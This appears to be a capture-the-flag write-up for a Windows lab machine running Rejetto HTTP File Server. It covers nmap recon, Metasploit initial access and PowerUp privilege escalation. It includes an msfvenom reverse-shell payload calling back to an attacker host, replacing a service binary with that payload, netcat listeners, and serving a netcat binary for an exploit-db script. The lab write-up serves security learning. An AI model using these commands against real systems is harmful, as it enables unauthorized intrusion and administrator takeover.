#### Background
This `CTF` involves enumerating a Windows machine, gain initial access with `Metasploit` and escalate privilege to Administrator

### Recon
- `nmap -sV` enumeration, identifying service along with their version 
- ` Rejetto HTTP File Server` was the file server that's running
### Initial access
- find for a vulnerability that lead us to get initial access to the machine on `metasploit` 
- set the `RHOST` to the target machine and run the exploit
### PrivEsc
- `powerup` is a `powershell` script that evaluate a windows machine for any misconfiguration and abnormalities. 
- load `powerup` script to the machine via `meterpreter` 
  ```zsh
  upload path_to_the_script_file
```
[more on meterpreter commands](https://medium.com/@msbj/decoding-meterpreter-commands-dca5bd25873f)

- load `powershell` into meterpreter, then get into it, by using `powershell_shell` command
- run the `powerup` script you uploaded, 
  ```zsh
  . .\powerUp.ps1
```
assuming that's how you named the script
- invoke the scan
  ```zsh
  Invoke-AllChecks
```

- Found a service whose `CanRestart` value is set to `True` and it was `_AdvancedSystemCareService9_`
- generate a reverse shell as an window executable
  ```zsh
  msfvenom -p windows/shell_reverse_tcp LHOST=<attacker ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```
- upload the reverse shell via meterpreter
- now enter to a `shell`
- stop the service identified to be vulnerable by
  ```powershell
  sc stop AdvancedSystemCareService9
```
- change the file it uses for operation, _the location could be found from the initial scan_, by the reverse shell you just generated. 
  ```powershell
  copy ASCService C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
```

- start listening from local machine
  ```zsh
  nc -lvnp 4443
```
- start the service back
  ```powershell
  sc start AdvancedSystemCareService9
```
Hollaaa! Now you gotta get the Admin shell from you local machine...
#### Without Meterpreter
- download the exploit from `exploit.db`
- edit the port and IP in the script, the attacker IP being your machine IP
- add 8000 port to the `ip_adddr` variable of `local_port` 
- download the netcat static binary
- server the binary via `python3 -m http.server 8000`
- start listening `nc -lvnp 443`
- run the exploit with the correct argument 
  ```zsh
  python2 exploit.py target_ip 8080
```
